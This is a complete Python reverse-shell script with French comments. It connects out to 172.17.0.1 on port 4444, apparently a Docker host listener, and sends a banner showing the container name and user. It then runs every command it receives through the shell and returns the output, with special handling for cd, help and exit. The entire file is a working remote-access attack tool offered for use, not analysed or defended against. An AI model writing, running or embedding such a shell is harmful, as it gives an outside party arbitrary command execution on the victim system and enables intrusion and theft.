#!/usr/bin/env python3
import socket
import subprocess
import os

# ===== CONFIGURATION =====
HOST = "172.17.0.1"  # <-- CHANGEZ CETTE IP SI NÉCESSAIRE
PORT = 4444
# =========================

def main():
    try:
        # Créer la socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Message de bienvenue
        banner = f"""
╔═══════════════════════════════════════╗
║   REVERSE SHELL CONNECTÉ              ║
║   Container: {socket.gethostname():<20}║
║   User: {os.getenv('USER', 'unknown'):<25}║
╚═══════════════════════════════════════╝
$ """
        s.send(banner.encode())
        
        # Boucle principale
        while True:
            # Recevoir la commande
            data = s.recv(4096).decode('utf-8').strip()
            
            if not data:
                break
            
            # Commandes spéciales
            if data.lower() in ['exit', 'quit', 'bye']:
                s.send(b"\n[+] Closing connection...\n")
                break
            
            if data.lower() == 'help':
                help_msg = """
Available commands:
  exit/quit/bye  - Close connection
  help           - Show this help
  cd <dir>       - Change directory
  Any shell cmd  - Execute command
$ """
                s.send(help_msg.encode())
                continue
            
            # Commande cd spéciale
            if data.startswith('cd '):
                try:
                    path = data[3:].strip()
                    os.chdir(path)
                    s.send(f"[+] Changed to {os.getcwd()}\n$ ".encode())
                except Exception as e:
                    s.send(f"[-] Error: {str(e)}\n$ ".encode())
                continue
            
            # Exécuter la commande
            try:
                result = subprocess.run(
                    data,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                output = result.stdout + result.stderr
                
                if output:
                    s.send(output.encode())
                else:
                    s.send(b"[+] Command executed (no output)\n")
                    
                s.send(b"$ ")
                
            except subprocess.TimeoutExpired:
                s.send(b"[-] Command timeout (>30s)\n$ ")
            except Exception as e:
                s.send(f"[-] Error: {str(e)}\n$ ".encode())
        
        s.close()
        
    except ConnectionRefusedError:
        print(f"[!] Connection refused to {HOST}:{PORT}")
        print("[!] Make sure netcat is listening!")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
